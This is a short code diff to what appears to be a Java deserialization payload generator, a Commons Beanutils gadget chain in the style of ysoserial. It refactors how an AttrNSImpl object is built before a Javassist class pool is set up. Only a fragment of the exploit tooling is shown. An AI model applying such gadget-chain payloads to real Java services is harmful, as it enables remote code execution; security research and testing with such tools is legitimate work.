@@ -28,9 +28,10 @@ public class CommonsBeanutilsAttrCompare_183 implements ObjectPayload<Queue<Obje
     @Override
     public Queue<Object> getObject(Object template) throws Exception {
 
-        AttrNSImpl attrNS1 = new AttrNSImpl();
-        CoreDocumentImpl coreDocument = new CoreDocumentImpl();
-        attrNS1.setValues(coreDocument,"1","1","1");
+//        AttrNSImpl attrNS1 = new AttrNSImpl();
+//        CoreDocumentImpl coreDocument = new CoreDocumentImpl();
+//        attrNS1.setValues(coreDocument,"1","1","1");
+        AttrNSImpl attrNS1 = new AttrNSImpl(new CoreDocumentImpl(),"1","1","1");
 
         ClassPool pool = ClassPool.getDefault();
         pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
